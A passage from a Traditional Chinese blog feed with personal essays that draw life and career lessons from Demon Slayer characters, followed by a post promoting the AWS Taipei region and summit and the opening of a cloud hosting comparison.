title="最重要的創造：整個人生"></a>最重要的創造：整個人生</h2><p>什麼是成功，賺錢是成功嗎? 追求快樂是對的嗎? 會不會因為自始至終都在追求反而更不快樂?</p><p>年輕的時候曾看過類似的話，大概是說你現在挑工作，之後就會換成工作挑你，即便是不喜歡的事情，練習做好也會是種成長。</p><p>出社會後，認真覺得生活是自己的不是長輩的更不是老闆的，整個人生如果不應該是階層和官僚討好，又何必每天看著小位置煩惱?</p><p>工作上能做的努力就是塑造好的環境，或是用最快的速度變強然後去更好的環境，雖然選擇變成鬼去同流合汙適應環境也是種選擇，但好像也不是那麼必須。</p><blockquote><p>Teddy Daniels: Which would be worse, to live as a monster or to die as a good man?</p></blockquote><p><img src="/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/be-ghost.jpg"></p><p>人的生活簡單區分也就是三件事，工作、家庭和生活，如何活像個人，最根本的還是找到努力的意義。</p><p>工作上，也許能夠想想平常做什麼事情會忘記時間，什麼時候會不自覺邊哼歌邊做事情。長大之後漸漸發現，最該做的是加強自己的擅長的事情而非改善缺點，畢竟沒有天賦的過度努力終究也只是個秀才。</p><p>但關於家庭、工作和生活，總還有些事情沒有想的很透徹。</p><p>在鬼滅之刃中，主角是一個賣炭的農村少年炭治郎。值得想想的是炭治郎在遭遇吃人鬼滅門，只剩下也變成鬼的妹妹後，為什麼最終會選擇拚了命的鍛鍊選擇成為鬼殺隊，就連師傅安排劈開石頭這麼荒唐的任務都日以繼夜的不斷練習?</p><p><img src="/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/kill-rock.jpg"></p><p>當遭遇人生中的變故，整個家裡只剩下變成鬼存活下來的妹妹，炭治郎剩下唯一的希望就剩下有一天能夠讓妹妹過回正常的生活。</p><p>在這個故事中，我感受到只要擁有想要守護的東西人就會變得更強，無論鬼奪走多少性命，意志是怎麼樣都不會被打敗的，想起了大學到法律系修課，柯柯老師說，學法律，能夠讓我們在需要的時候守護我們想守護的東西。</p><blockquote><p>即便不斷失去，人也只能活下去，無論遭受多嚴重的打擊都要活下去，只有活著也才有可能性。</p></blockquote><p>還記得六年多前是我開始第一份工作的時候，那陣子也是有記憶以來第一次看著親人在眼前死去，而且是長輩裡最親近的阿公。</p><p>那陣子的我常常爬到公司頂樓，看著整個台元一期二期三期，想像著許多人關在玻璃窗裡面榨乾腦力，但回頭看看自己，親人都快死掉了，除了會讀書其實就像個廢物一樣，什麼也改善不了。</p><p>那之後，過了好一陣子對事物沒什麼感覺的生活。當然日常跟一般人相處還是可以角色扮演表面上看起來很開心，但實際上心裡就空洞洞的感受不到什麼感覺。</p><p>在阿公過世的隔年，接著是外婆在看護沒注意的時候噎到，送醫院之後我們大家都不在身邊，只聽我媽說事態有點嚴重，接下來通知只告訴我們醫院也不用去了，可以回去家裡等，當然，回來的就是準備放在冰櫃裡的人了。我還記得，外婆家的日曆停在送醫院那天，那天的標語我還拍了起來。</p><blockquote><p>沒有被思考過的生活，不值得過。</p></blockquote><p><img src="/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/think-life.jpg"></p><p>有段時間，我看了很多電影，有部是林書宇的百日告別，最後蠻打動我的一句是人的死去在意義上會有兩次，一次在肉體，另一次在人們心裡。</p><p>認真想想，如果有一天突然走了，可能很多人根本不會知道。因為就是一個月、兩個月、三個月、甚至一年、兩年 、三年聯絡一次，又怎麼會知道下次電話打不通是什麼原因？或許我們早已在人們心裡死去了。</p><p>生老病死，生有時，死有時，栽種有時，收穫有時，人與人之間的關係也因為生命的長短而開始有了需要珍惜和把握的地方，也因為有限，所以才特別，才顯得獨一無二。</p><blockquote><p>衰老和死亡是生命短暫人類這種生物的美好之處。<br>因為會衰老、會死亡，才更加令人覺得可愛、尊貴。</p></blockquote><p>在成長的過程中，有默默發現，雖然確認終點這件事是重要的，但過去種種體驗都告訴我們，真正的目的其實是過程而不是終點，像是去浙江實習、去南京交換、去完成馬拉松、去完成單車環島、去完成爬玉山，那些過程中的體驗和感受才讓我們能夠成為我們。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/yUWAYvfQ0dA?si=neduWofFHEZX3PVa" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>在成長的過程中，也會遇到許多選擇，會有很多得到和失去，即便不斷失去，即便生活中有可能像卡通中一樣會遇到鬼遇到病毒，也只能努力生活下去，活下去，也才有可能性。</p><p>我想生活的目的可能是能夠創造幸福，還有在精神與物質之間取得平衡。</p><p><a href="https://www.dcard.tw/f/mood/p/236168854">https://www.dcard.tw/f/mood/p/236168854</a></p><p>生活中值得探索的事物很多，有更多美好值得我們去了解和遇見，而成長的過程中不免也會遇到那些討厭的，所以也要記住我們曾經喜歡怎樣的人、討厭什麼樣的人，記得未來，要變成自己喜歡的模樣，成為自己看得起的大人。</p><p>要變成自己認為喜歡的模樣，除了努力和運用天賦之外，幸運和時機其實也很重要，在遇到幸運之前，也許就像炎柱說要持續不斷的精進，有機會的時候也要懂得推銷自己，理想的生活也才會更有機會被創造出來。</p><blockquote><p>如果生活是一種創造，那最重要的創造我想會是整個人生。</p></blockquote><p>期待未來的生活能夠擁有意義和對社會付出些許貢獻，能成為誠實正直內心溫柔但攻擊力強大的人，這是大學畢業十年後給自己的期許。</p><blockquote><p>為與橋下東流水，出山要比在山清。</p></blockquote><p>如果你看完《鬼滅之刃 無限列車篇》，心裡也有那團火，不妨記住炎柱的一句話：</p><blockquote><p>「不管未來的路怎麼走，你都要成為一個出色的人。」</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 那些鬼滅告訴我的事情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鬼滅之刃 </tag>
            
            <tag> 鬼滅無限列車篇 </tag>
            
            <tag> 從動漫看人生 </tag>
            
            <tag> 炎柱杏壽郎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杏壽郎教我的三件事</title>
      <link href="/2025/08/08/kimetsu-no-yaiba/rengoku-kyoujurou-life-lessons/"/>
      <url>/2025/08/08/kimetsu-no-yaiba/rengoku-kyoujurou-life-lessons/</url>
      
        <content type="html"><![CDATA[<blockquote><p>燃燒殆盡，不等於犧牲，而是有意義的投入。</p></blockquote><p>最近重新看了《鬼滅之刃》電影版（無限列車篇），明明是動畫，卻讓我這個工程師阿宅在螢幕前默默眼眶濕潤。</p><p>尤其是那位火焰般燃燒的男人——炎柱・煉獄杏壽郎，他說的每一句話，都像是在對著「已經工作十年」的我說的。</p><p>在出了社會之後，我在追求這些績效表現、成長成就的同時，總在有些時候突然有種自己慢慢被消逝的感受。</p><p>接下來想從杏壽郎、簡立峰三個階段生涯故事和大家談談認同與意義。</p><h2 id="煉獄杏壽郎-炎柱"><a href="#煉獄杏壽郎-炎柱" class="headerlink" title="煉獄杏壽郎 | 炎柱"></a>煉獄杏壽郎 | 炎柱</h2><p>177 公分 | 72kg | 20 歲 | 5 月 10 日生 | 金牛座</p><p>“杏壽郎是鬼殺隊炎柱，炎之呼吸的使用者。</p><p>有著一頭黃紅色相間的長髮，鬼殺隊制服外披著火焰圖案的羽織。</p><p>性格樂天，熱情如火，不太聽人說話，卻擁有出色的領導力和判斷力，在隊中是有如大哥般存在。</p><p>父親槇壽郎為前炎柱，另有一名幼弟千壽郎，母親在他幼年時因病過世，原本樂於教導孩子劍術的父親不堪喪妻之痛，從此變得委靡不振甚至開始酗酒。</p><p>於是他靠研讀家傳的炎之呼吸指南書自學努力成為柱，年紀輕輕就讀完三冊。</p><p>後在眾人合力之下擊退魘夢、猗窩座，成功保住車上 200 名乘客的性命，臨終前將想告訴父親和千壽郎的話傳達給炭治郎，在看到母親的魂魄出現在面前後含笑而逝。” (摘自 <a href="https://zh.wikipedia.org/wiki/%E9%AC%BC%E6%BB%85%E4%B9%8B%E5%88%83%E8%A7%92%E8%89%B2%E5%88%97%E8%A1%A8">wiki</a>)</p><blockquote><p>柱ならば後輩の盾となるのは当然だ</p></blockquote><p>因為我是柱，成為後輩的盾是理所當然的事。</p><p>這句是炎柱杏壽郎在死去前跟晚輩說的話，杏壽郎出生在嚴格的家庭，從小母親就教導他身為強者的唯一使命，就是要保護弱者。</p><h3 id="杏壽郎為什麼這麼燃？是他太傻？還是太懂？"><a href="#杏壽郎為什麼這麼燃？是他太傻？還是太懂？" class="headerlink" title="杏壽郎為什麼這麼燃？是他太傻？還是太懂？"></a>杏壽郎為什麼這麼燃？是他太傻？還是太懂？</h3><p>杏壽郎他爸退隱、失志、破壞了他的信心，但他卻沒因此變成「厭世嘴砲男」，反而還拉著弟弟成長、成為柱之後鼓勵晚輩炭治郎。</p><p>我後來才懂，那不是熱血，是修煉，杏壽郎早就經歷過我們會遇到的那些心魔：</p><ul><li>做再多也得不到認可</li><li>想努力卻被現實拉扯</li><li>看到別人比自己更有天分</li><li>明明想放棄，卻又覺得這樣不行</li></ul><p>杏壽郎沒有「擺爛」也沒有「厭世」，他選擇的是——把那份傷痛轉換成堅定。</p><p>這是不是很像我們在人生中的某些轉折點？不再是「為了證明自己而努力」，而是「知道自己可以，所以願意守護」。</p><p>杏壽郎是個豪邁、爽朗、正直的人，在無限列車篇中，還記得他在火車上吃了很多美味便當，就是不停的吃、不停地大聲稱讚好吃！</p><p>在見到三個來支援的後輩，就是直接對著炭治郎、善逸、伊之助說你們都讓我來照顧吧！！！</p><iframe width="560" height="315" src="https://www.youtube.com/embed/tknn02o0B5o?si=oVgpot8Wly8SsE7h" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>遇到緊急問題發生時，杏壽郎在前往支援路上就先給化身為車輛的魘夢連續綿密的斬擊來增加危機反應時間。</p><p>在過程中也快速判斷現場狀況，讓炭治郎、伊之助去尋找並擊敗鬼，告訴晚輩說後面的五節車廂交給他保護。</p><p>其實，炎柱大可以直接自己做好斬殺鬼的任務，但因為炭治郎、伊之助並沒有能力保護這麼多車廂的乘客，所以杏壽郎在當下做了這樣的判斷和人力上的調度。</p><p>這樣的應變氣場和能力真的會讓後輩感到安心和願意努力的動力，伊之助也因此邊靠北邊心甘情願去配合指令動作。</p><h3 id="我會履行我的職責！在場的任何人都不會死去！"><a href="#我會履行我的職責！在場的任何人都不會死去！" class="headerlink" title="我會履行我的職責！在場的任何人都不會死去！"></a>我會履行我的職責！在場的任何人都不會死去！</h3><p>杏壽郎是個典型的「能者」，但他的強不只是體術，而是責任感。</p><blockquote><p>燃燒了不只一場戰鬥，也點燃了某些職涯的自我期許。</p></blockquote><p>杏壽郎那種：「我在這裡，所以別人會沒事」的態度，說實話，我在身邊某些朋友身上也看過，那些會自願 Cover 專案進度的 Senior，那些寧可晚上加班也要護住 Junior 的 Lead，那些被罵時先扛責但回頭再一一安撫團隊的人。</p><p>我曾經以為強大是為了升遷、為了年薪，但某些時刻，你會發現，<strong>強大是為了讓團隊裡更多人不受傷</strong>。</p><p>杏壽郎最後是用生命在守護整台列車，但他不是想「犧牲自己證明什麼」，他是做了自己該做的選擇，這點很重要。</p><p>身為工程師，我們常常燃燒自己在交付上、在 Debug 地獄裡、在撐住爛流程的現實中，但那跟杏壽郎不一樣。</p><p>燃燒不代表過勞，也不代表硬扛，真正的燃燒是：「我知道這件事值得我投注全部的能量。」</p><p>那是主動的選擇，不是被動的犧牲，不再只為自己活，而是因為有個更大的價值或信念，讓你願意站在那裡。</p><h2 id="生涯中的三個階段"><a href="#生涯中的三個階段" class="headerlink" title="生涯中的三個階段"></a>生涯中的三個階段</h2><p>杏壽郎的故事，讓我思考了人生可能會經歷的三個階段：</p><ol><li>成為強者，只是為了證明自己: 我們都從這裡開始，拚命成為不可取代的人，怕別人不認同。</li><li>強大之後，開始照顧別人: 當你不再需要證明自己，就會開始想：我可以幫誰撐起什麼？</li><li>願意燃燒，是因為相信值得: 你不再只為自己活，而是因為有個更大的價值或信念，讓你願意站在那裡。</li></ol><h3 id="第一個階段-成為強者，只是為了證明自己"><a href="#第一個階段-成為強者，只是為了證明自己" class="headerlink" title="第一個階段: 成為強者，只是為了證明自己"></a>第一個階段: 成為強者，只是為了證明自己</h3><blockquote><p>昨日の自分より確実に強い自分になれる</p></blockquote><p>簡立峰人生的第一階段在學術界鍛鍊 15 年，從私立大學到台大，五年半的碩士和博士學會了享受孤獨、空虛感，那個壓力就是老師很優秀、同學很優秀。</p><p>杏壽郎則是在小的時候母親就過世了，而為了追求曾經也是炎柱的父親認同，努力的成為炎柱，盼望得到父親稱讚與認同，對杏壽郎來說只要持續不斷的精進自己，你絕對可以比昨天的自己更強大。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/O5HJInVBPWg?si=J-ZwK54QtsNUoR5q" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>在第一個階段，社會其實很早就建立了一個體系，讓我們下意識去追求，像是追求績效表現、薪資成長。</p><p>我們都從這裡開始，拚命成為不可取代的人，怕別人不認同。</p><p>就像戰鬥的過程中上弦之參猗窩座，為了追求武藝至高的享受而成為了鬼。</p><p>在看到了杏壽郎身上的鬥氣已經接近了至高領域後，覺得好不容易有了可能會更強的對手，甚至希望炎柱也能夠變成鬼。</p><p>不知道你們是怎麼想和看待出社會工作這件事?</p><p>在出了社會之後，我在追求這些績效表現、成長成就的同時，總在有些時候突然有種在自己慢慢被消逝的感受，那個表層想法在鬼滅之中也許是我並不想成為鬼。</p><p><img src="/2025/08/08/kimetsu-no-yaiba/rengoku-kyoujurou-life-lessons/become-ghost.jpeg"></p><h3 id="第二個階段-強大之後，開始照顧別人"><a href="#第二個階段-強大之後，開始照顧別人" class="headerlink" title="第二個階段: 強大之後，開始照顧別人"></a>第二個階段: 強大之後，開始照顧別人</h3><p>在第二個階段，簡立峰選擇加入了 Google，成為 Google 在台灣的第一個員工。</p><p>選擇放棄過往學術的累積，是因為看到了全世界更優秀的學者。</p><p>簡立峰認為 Google 的研發如果可以在台灣，也許在十年二十年後台灣需要跟國際接軌，而台灣早已經培養了一群人準備好。</p><p>在杏壽郎成為炎柱之後，很開心的向父親報告這個好消息，父親卻對人生不再懷抱熱情，冷言冷語打發掉杏壽郎。</p><blockquote><p>そんなことで俺の情熱は無くならない！ 心の炎が消えることはない！</p></blockquote><p>即便如此杏壽郎仍舊鼓勵弟弟說：「老實說，父親並沒有高興，他說根本沒意義。但是我的熱情，不會因此消失！心中的火焰，從未消失過，我絕不會被挫敗！」</p><p>當杏壽郎在無限列車上見到三個來支援的後輩時，也是對著炭治郎、善逸、伊之助說大家都讓我來照顧，在這個階段杏壽郎是希望能培養接下來將成為柱的晚輩們。</p><p>當你不再需要證明自己，就會開始想：我可以幫誰撐起什麼？</p><p><img src="/2025/08/08/kimetsu-no-yaiba/rengoku-kyoujurou-life-lessons/become-teacher.jpeg"></p><h3 id="第三個階段-願意燃燒，是因為相信值得"><a href="#第三個階段-願意燃燒，是因為相信值得" class="headerlink" title="第三個階段: 願意燃燒，是因為相信值得"></a>第三個階段: 願意燃燒，是因為相信值得</h3><p>第三個階段，簡立峰體認到放棄重來並不是太難，如果還有一個 15 年，該思考的會是能夠做哪一件事情對自己、對生長這個社會能有幫助。</p><p>炎柱在拒絕猗窩座 “<strong>變成鬼獲得永生繼續精進武藝</strong>“ 的提議後，展開激戰導致煉獄身負致命傷，左眼內臟受傷、肋骨斷裂，雖然用了奧義勉強讓猗窩座負傷，但身體還是被猗窩座的右臂貫穿，最後還是犧牲了自己生命。</p><p>對於台灣企業轉型轉不過去，簡立峰看到的其實是一個新的機會，但這個機會不是他的機會，而是年輕人的機會。</p><p>在影片的分享中簡立峰說: 「人生都很難回頭去看，是因為那是一個假設性的問題，我只能說我運氣很好、時間、空間也剛剛好。我加入 Google，把 Google 帶來台灣，有一群年輕人，在台灣加入 Google，從 Google 台灣去了全世界，那一群年輕人終究會回來，我會在那裡等他們，之後他們要把台灣帶到另一個地方去。」</p><p>在最後的最後，杏壽郎跟三個徒弟說，竈門少年、豬頭少年、黃髮少年，你們要繼續成長下去，持續不斷的精進自己，而後就要由你們成為接下來的柱，我相信你們。</p><blockquote><p>對於晚輩來說，既然被人相信了，就不要去想回應這份期待以外的事</p></blockquote><p>也許目前的年紀和歷練都不夠，但這就是我目前認為在生涯三個階段可能會有的心境轉換。</p><p>前面兩個階段也許是珍惜、照顧好自己的獨特性，並持續不斷的精進自己，期許能夠成為一個有力量的人。</p><p>在談第三個階段的感想前，想先分享當杏壽郎和猗窩座戰鬥到了最後，杏壽郎在快要倒下前，回顧過往生命時見到母親後的那段談話:</p><blockquote><p>杏壽郎問母親我做的還好嗎? 該做的事，該履行的事，都有做好嗎？<br>媽媽笑著對他說：「你做得非常好哦！」<br>太好了！ 杏壽郎這個時候開心的微笑也閉上了眼睛。</p></blockquote><p>在第三個階段，也許是處在順其自然的基礎之上，盡力的照顧我們所擁有的生活和人事物，最終能夠真誠的去幫助他人。</p><p>這會是種能夠展現生活意義的一種感受，也許在第三個階段，聰明和有績效的人可能不一定是最有價值的。</p><p>這篇文章是我認識的炎柱杏壽郎，看了兩次電影都是滿滿感動，即使一直到了現在，打心得的現在還是深受影響，最後送給大家這句帥爆的話，想告訴大家，大哥，沒有輸!</p><blockquote><p>我會履行我的職責！在場的任何人都不會死去！</p></blockquote><h2 id="你的人生，在第幾階段呢？"><a href="#你的人生，在第幾階段呢？" class="headerlink" title="你的人生，在第幾階段呢？"></a>你的人生，在第幾階段呢？</h2><p>這些動畫角色，不只是一場場打鬥、一段段感情，有時候，就是你人生某個片段的隱喻。</p><p>我們都想變強，但更重要的是：</p><blockquote><p>你希望，強大了之後，成為怎樣的大人？</p></blockquote><p><img src="/2025/08/08/kimetsu-no-yaiba/rengoku-kyoujurou-life-lessons/rengoku-kyoujurou-life-lessons.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 那些鬼滅告訴我的事情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鬼滅之刃 </tag>
            
            <tag> 鬼滅無限列車篇 </tag>
            
            <tag> 從動漫看人生 </tag>
            
            <tag> 炎柱杏壽郎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>下弦之壹魘夢的情緒管理學</title>
      <link href="/2025/08/02/kimetsu-no-yaiba/emotion-management/"/>
      <url>/2025/08/02/kimetsu-no-yaiba/emotion-management/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安，最近看了《鬼滅之刃：無限城篇》預告，深深被下弦之壹魘夢操控人心的劇情震到雞皮疙瘩。劇中一句台詞讓我尤其有感：</p><blockquote><p>如果光憑憤怒就能勝利，那世界上就不會有鬼了。</p></blockquote><p>他說的是對，也說的是錯——因為情緒，不只是你的敵人，也可能是你的陷阱。</p><h2 id="下弦之壹魘夢：操控人性的真強者"><a href="#下弦之壹魘夢：操控人性的真強者" class="headerlink" title="下弦之壹魘夢：操控人性的真強者"></a>下弦之壹魘夢：操控人性的真強者</h2><p>鬼舞辻無慘領著上弦、下弦，魘夢是最強下弦之一。他不是靠拳頭壓人，而是用夢境玩心理：</p><blockquote><p>「人類的原動力是心靈、精神，因為人類的心全都一樣，就像玻璃工藝品一般地脆弱。」</p></blockquote><p>這句話猛不猛？他讓人自己掉進自己的情緒陷阱裡，不輕易動手卻收割人心。</p><blockquote><p><img src="https://loory.tw/wp-content/uploads/20201031031938_50.jpg" alt="下弦之壹魘夢"><br>Source: <a href="https://loory.tw/wp-content/uploads/20201031031938_50.jpg">https://loory.tw/wp-content/uploads/20201031031938_50.jpg</a></p></blockquote><h2 id="真實業務代表的情緒實戰篇"><a href="#真實業務代表的情緒實戰篇" class="headerlink" title="真實業務代表的情緒實戰篇"></a>真實業務代表的情緒實戰篇</h2><p>接下來想分享一個故事，一個業務代表的故事:</p><p>回想幾年前，我當業務代表去跟某客戶談延遲、變更、預算不足……</p><p>因為業務代表是代表公司，但當業務回到公司的時候又代表客戶，到了客戶端，當然需要代表公司解釋這一切，解釋很多問題發生的原因。</p><p>至於為什麼要說和要說什麼，不管是時程、預算、範圍改變都該說，因為範圍改變也會造成時程、預算、品質改變。</p><p>當範圍改變時我們應該講清楚，告訴對方不好意思，現在時間也要變、預算也要加，不能範圍改變但時程照舊，到時就搞死自己。</p><p>這時候對方總經理走進來，結果那位總經理當場罵我：</p><blockquote><p>你這種業務，就給我滾出去。</p></blockquote><p>憤怒幾乎衝上腦門，但我深呼吸鎮定下來，告訴自己：</p><blockquote><p>你只是角色，你只是公司派來傳話的人，你不是他的情緒垃圾桶。</p></blockquote><p>你知道你只是飾演這個角色，結果你把個人情緒帶進去的時候，會造成什麼問題？</p><blockquote><p>是你跟公司都賠進去了。</p></blockquote><p>因為當下又想到另外一件事，業務代表只是代表公司。</p><p>公司就是公司，對方罵公司的東西，只是他不小心把事跟人混在一起。</p><p>當一個人被羞辱可能就離開出去，但是我選擇了鎮定回覆：</p><blockquote><p>我們會如何處理，不好意思造成困擾，以下是後續計畫。</p></blockquote><p>結果發生了什麼？兩天後，在董事長的餐會上，那位客戶居然誇獎：</p><blockquote><p>這個!打不死的蟑螂。</p></blockquote><p>這讓我想起一句佛家格言：</p><blockquote><p>將欲弱之，必固強之；少則得，多則惑。</p></blockquote><p>魘夢靠操控人心獲勝，而炭治郎選擇用善良與堅定拆掉夢境與怒火。</p><p>總經理靠怒氣試圖掌控局面，業務透過發現並轉換思考來消散怒氣。</p><p>僅僅是價值觀上的小小的動作，讓人類最終展現出兩種截然不同的結果。</p><h2 id="情緒管理的思考-X-鬼滅精神"><a href="#情緒管理的思考-X-鬼滅精神" class="headerlink" title="情緒管理的思考 X 鬼滅精神"></a>情緒管理的思考 X 鬼滅精神</h2><p>我們在經營的其實是個人品牌，公司賠進去是因為公司沒做好，可是，你不要把自己也賠進去了。</p><p>互槓上去之後，公司賠了你也賠了，最後你也救不了，然後也沒有顯出你多厲害，結果反而僵局更僵。</p><ul><li>情緒不是錯，但它可能讓你離目標更遠。</li><li>與其任憑怒火爆炸，不如學會把情緒當訊號看待。</li><li>堅定不是逃避憤怒，而是在怒火中保持冷靜。</li></ul><blockquote><p>所謂強大，不是只能用在肉體上的形容詞。</p></blockquote><p>所以下次如果是我們遇到了這樣的事情，我們又會選擇怎麼做?</p><p>PS: 業務代表的故事來自於完成六大馬的象總王冠翔，真的很勵志!!!</p><iframe width="560" height="315" src="https://www.youtube.com/embed/4bXKIFVzHJs?si=5Pm3LEHCp3qm7278" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> 那些鬼滅告訴我的事情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鬼滅之刃 </tag>
            
            <tag> 鬼滅無限列車篇 </tag>
            
            <tag> 從動漫看人生 </tag>
            
            <tag> 魘夢 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 AWS 雲端高峰會登台</title>
      <link href="/2025/06/22/cloud-platform/2025-aws-taiwan-summit/"/>
      <url>/2025/06/22/cloud-platform/2025-aws-taiwan-summit/</url>
      
        <content type="html"><![CDATA[<p>🎉 各位大大安安，今天小編要來聊一個讓工程師雙眼發光的消息：</p><blockquote><p>AWS 終於！終於！ 在我們熱騰騰的台灣土地上，插旗開主機房啦！</p></blockquote><h2 id="📦-AWS-本地機房開張，延遲大減、資料合規一次到位"><a href="#📦-AWS-本地機房開張，延遲大減、資料合規一次到位" class="headerlink" title="📦 AWS 本地機房開張，延遲大減、資料合規一次到位"></a>📦 AWS 本地機房開張，延遲大減、資料合規一次到位</h2><p>先來一段大家最關心的性能與價格：</p><ul><li>✅ 比美國區域貴一點</li><li>✅ 但比東京便宜 9%（有算有賺）</li><li>✅ 如果你原本是為了「低延遲」才部署東京，現在可以搬回台灣試試水溫了！</li></ul><p>💡 官方給的理由也很實在：</p><p>在台灣安全地儲存資料並推動創新，全新的 AWS 亞太 (台北) 區域將使具有資料落地需求的客戶在台灣安全地儲存資料，同時提供更低的延遲。</p><p>這句翻譯一下就是：</p><blockquote><p>「有些產業法規要求資料不得跨境，AWS 台北 Region 正好成了解方。」</p></blockquote><p>終於不用再硬找 workaround，合規、效能兩邊顧到，直接爆擊台灣各種雲端需求痛點！</p><h3 id="🧊-歡慶-AWS-台灣區域正式啟用，新戶註冊即送贈品"><a href="#🧊-歡慶-AWS-台灣區域正式啟用，新戶註冊即送贈品" class="headerlink" title="🧊 歡慶 AWS 台灣區域正式啟用，新戶註冊即送贈品"></a>🧊 歡慶 AWS 台灣區域正式啟用，新戶註冊即送贈品</h3><p>歡慶 AWS 基礎設施區域（Region）在台灣正式啟用！特別舉辦限定活動，新戶註冊即送贈品，數量有限！</p><p>越早完成註冊 + 登記領取，即可拿到 AWS 保溫瓶，是的你沒看錯，就是精緻的保溫瓶。</p><p>雖然雲端很冷？但熱水還是要裝的！夏天當然也很保冰？</p><p>👉 註冊連結在這邊：<a href="https://reurl.cc/qGeqyE">https://reurl.cc/qGeqyE</a></p><h3 id="🚀-見證從雲端到衛星"><a href="#🚀-見證從雲端到衛星" class="headerlink" title="🚀 見證從雲端到衛星"></a>🚀 見證從雲端到衛星</h3><p>前陣子小編參戰 “從區域到全球：亞馬遜創新戰略發佈會”，見證從雲端到衛星，副總統來了我也來了！</p><p>除了技術還有點生活觀察：你以為這是產業先鋒的場子？但同時也是抽獎暨頂樓野餐交流會，不僅吸收新知，還可以吃章魚燒、調酒、精緻點心和餐盒，有吃又有拿 💼</p><p>但如果你是想了解 AWS 真功夫的工程夥伴，建議下次直上 AWS 社群日，會紮實很多，還可以拿到免費試用額度！</p><p>戰略發佈會有幾個亮點！</p><ul><li>🔸 低軌衛星通訊計畫：AWS 讓網路無死角，真 · 雲端到宇宙</li><li>🔸 AI 工具人真的接地氣：股票走勢用 AI 分析 📈 紡織業 AI 配線配圖 👕</li><li>🔸 AWS 台北 region 開放，台灣同時也是全球中文技術客服的據點，技術客服要會網路 + 系統指令 + 看 log 排障礙，想轉職、跳槽的夥伴可以偷偷研究一下，外商光環技術歷練相信不會後悔 🚀</li></ul><p>最後一提，AI 居然現在也能看面相 + 算命 + 姓名學了，下一步是不是要幫你配對交友啦 💘</p><h2 id="🎯-AWS-雲端高峰會也同步開轟，整個就是火力全開"><a href="#🎯-AWS-雲端高峰會也同步開轟，整個就是火力全開" class="headerlink" title="🎯 AWS 雲端高峰會也同步開轟，整個就是火力全開"></a>🎯 AWS 雲端高峰會也同步開轟，整個就是火力全開</h2><p>雲端大神出任務，一次打通雲端轉型的任督二脈！<br>你能想到的重點，這場高峰會都幫你預熱好了 👇</p><p>🌐 核心亮點：</p><ul><li>70+ 分堂議程：AI、資料分析、應用現代化全打包</li><li>ExecLeader 高層論壇 &amp; 新創賦能日：想創業、轉職這裡都有線索</li><li>GameDay 技術實戰模式 ON：AWS 工具從講台用到戰場</li><li>AI Hub ＋ Developer Lounge：觀摩＋動手，從萌新到老鳥直接升級</li></ul><p>🎁 現場還送（真的不是抽的，是「你來我就給你」的那種誠意）：</p><ul><li>早鳥禮（都市機能包 &#x2F; 手機掛繩）</li><li>集點送 AWS 時尚半月包</li><li>參與主題演講 + 問卷還送 AWS 悶燒杯</li></ul><p>📅 2025 AWS 雲端高峰會活動資訊：</p><ul><li>日期：2025&#x2F;7&#x2F;29（二）～ 7&#x2F;30（三）</li><li>時間：08:30 - 17:30</li><li>地點：南港展覽館 2 館</li><li>報名連結：👉 <a href="https://aws.amazon.com/tw/events/summits/taipei/">https://aws.amazon.com/tw/events/summits/taipei/</a></li></ul><p>不管你是想認識 AWS 台北新 Region、還是想深入生成式 AI、低軌衛星與雲端創新技術的現場應用，這場高峰會都不會讓你白走一趟！</p><p>AWS 雲端高峰會，一次直達雲端核心技術＋轉型實戰新契機。</p><p>還不快分享給你身邊那位還在煩部署選區的朋友 XD</p>]]></content>
      
      
      <categories>
          
          <category> 雲端服務 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> 雲端服務 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS Lambda vs EC2 vs Azure Web App vs Vercel</title>
      <link href="/2025/06/22/cloud-platform/cloud-web-service/"/>
      <url>/2025/06/22/cloud-platform/cloud-web-service/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會簡單比較幾種常見的雲端架站選擇，特別針對前端工程師、Node.js 使用者設計開發環境時常見的場景。</p><h2 id="AWS-Lambda：Serverless-的快速入口"><a href="#AWS-Lambda：Serverless-的快速入口" class="headerlink" title="AWS Lambda：Serverless 的快速入口"></a>AWS Lambda：Serverless 的快速入口</h2><p>對前端工程師來說，Serverless 的最大吸引力就是「不用管機器」：</p><ul><li>Lambda 支援 Node.js，搭配 API Gateway，就能快速上線</li><li>適合微服務或是小型 API 搭配 EJS 等輕量模板</li><li>靜態資源需搭配 S3 + CloudFront，需額外維護資源路徑與快取設計</li></ul><p>推薦工具：以前常用 scandium tool，但現在多數團隊改用 Serverless Framework，支援多雲端平台，部署流程更穩定、社群資源也更完整。</p><p>適合用在：快速試作、事件驅動、短流程、不需持久連線的後端需求。</p><h2 id="AWS-EC2：自由度最高，但維運成本也高"><a href="#AWS-EC2：自由度最高，但維運成本也高" class="headerlink" title="AWS EC2：自由度最高，但維運成本也高"></a>AWS EC2：自由度最高，但維運成本也高</h2><p>EC2 